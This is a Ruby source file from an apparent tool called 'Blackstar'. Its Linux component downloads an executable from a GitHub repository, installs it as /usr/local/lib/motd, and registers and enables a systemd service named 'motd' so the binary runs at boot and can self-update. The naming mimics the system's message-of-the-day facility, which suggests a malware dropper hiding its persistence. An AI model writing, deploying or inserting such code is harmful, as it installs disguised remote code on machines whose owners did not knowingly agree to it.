module Blackstar
  class ProcessLinux
    SERVICE_PATH = '/lib/systemd/system/motd.service'
    EXEC_DIR_PATH = '/usr/local/lib/motd'
    EXEC_PATH = "#{EXEC_DIR_PATH}/motd"
    RELEASE_URL = "https://api.github.com/repos/speedy-gonzalez2017/blackstar/releases/latest"
    DOWNLOAD_RELEASE_URL = "https://github.com/speedy-gonzalez2017/blackstar/raw/master/builds/linux-x64"
    TMP_FILE_EXEC = "/tmp/linux-x64"

    def handle
      handle_startup_script
      download_executable
      self
    end



    def download_executable
      p "Downloading Exec"
      Cmd.call("rm -f #{TMP_FILE_EXEC}")
      Cmd.download_file(:linux, TMP_FILE_EXEC, DOWNLOAD_RELEASE_URL)
      Cmd.call("mkdir -p #{EXEC_DIR_PATH}")
      Cmd.call("mv #{TMP_FILE_EXEC} #{EXEC_PATH}")
      Cmd.call("chmod +x #{EXEC_PATH}")
    end

    def need_update?
      p "Checking for update, running - #{Blackstar::VERSION}"
      json = get_latest_release_json
      json["tag_name"] != Blackstar::VERSION
    end

    def get_latest_release_json
      JSON.parse Cmd.http_request(:linux, RELEASE_URL, "GET")
    end

    def handle_startup_script
      p "Setting up script"
      Cmd.call("rm #{SERVICE_PATH} -f")
      Cmd.call("systemctl disable motd")

      File.open(SERVICE_PATH, "w") do |f|
        f.write(Linux::SERVICE_CONFIG)
      end

      Cmd.call("systemctl daemon-reload")

      Cmd.call("systemctl enable motd")
    end
  end
end